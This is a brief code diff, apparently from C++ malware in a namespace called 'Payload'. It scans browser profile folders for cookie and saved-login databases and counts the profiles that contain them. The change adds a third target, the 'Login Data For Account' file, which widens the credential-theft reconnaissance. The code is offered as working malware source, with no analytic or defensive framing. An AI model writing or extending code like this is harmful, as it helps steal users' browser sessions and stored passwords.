@@ -189,7 +189,10 @@ namespace Payload {
                     if (entry.is_directory()) {
                         auto cookiePath = entry.path() / "Network" / "Cookies";
                         auto loginPath = entry.path() / "Login Data";
-                        if (std::filesystem::exists(cookiePath) || std::filesystem::exists(loginPath)) {
+                        auto loginAccountPath = entry.path() / "Login Data For Account";
+                        if (std::filesystem::exists(cookiePath) ||
+                            std::filesystem::exists(loginPath) ||
+                            std::filesystem::exists(loginAccountPath)) {
                             profileCount++;
                         }
                     }
